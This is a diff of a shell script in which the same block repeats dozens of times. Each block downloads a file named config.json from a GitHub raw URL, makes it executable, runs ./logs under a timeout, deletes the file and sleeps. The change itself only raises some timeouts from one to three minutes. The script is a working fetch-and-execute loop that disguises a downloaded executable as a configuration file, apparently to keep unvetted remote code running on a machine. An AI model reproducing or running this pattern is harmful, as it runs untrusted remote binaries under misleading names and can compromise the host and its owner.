@@ -10,7 +10,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -22,7 +22,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -34,7 +34,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -46,7 +46,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -58,7 +58,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -70,7 +70,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -82,7 +82,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -94,7 +94,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -106,7 +106,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -118,7 +118,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -130,7 +130,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -142,7 +142,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -154,7 +154,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -166,7 +166,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -178,7 +178,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -190,7 +190,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -202,7 +202,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -214,7 +214,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -226,7 +226,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -238,7 +238,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -250,7 +250,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -262,7 +262,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -274,7 +274,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -286,7 +286,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -298,7 +298,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -310,7 +310,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -322,7 +322,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -334,7 +334,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -346,7 +346,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -358,7 +358,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -370,7 +370,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -382,7 +382,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -394,7 +394,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -406,7 +406,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -418,7 +418,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -430,7 +430,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -442,7 +442,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -454,7 +454,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -466,7 +466,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -478,7 +478,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -490,7 +490,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -502,7 +502,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -514,7 +514,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -526,7 +526,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -538,7 +538,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -550,7 +550,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -562,7 +562,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -574,7 +574,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -586,7 +586,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -598,7 +598,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -610,7 +610,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -622,7 +622,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -634,7 +634,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -646,7 +646,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -658,7 +658,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -670,7 +670,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -682,7 +682,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -694,7 +694,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -706,7 +706,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -718,7 +718,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -730,7 +730,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -742,7 +742,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -754,7 +754,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -766,7 +766,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -778,7 +778,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -790,7 +790,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -802,7 +802,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -814,7 +814,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -826,7 +826,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -838,7 +838,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -850,7 +850,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -862,7 +862,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -874,7 +874,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -886,7 +886,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -898,7 +898,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -910,7 +910,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -922,7 +922,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -934,7 +934,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -946,7 +946,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -958,7 +958,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -970,7 +970,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -982,7 +982,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -994,7 +994,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1006,7 +1006,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1018,7 +1018,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1030,7 +1030,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1042,7 +1042,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1054,7 +1054,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1066,7 +1066,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1078,7 +1078,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
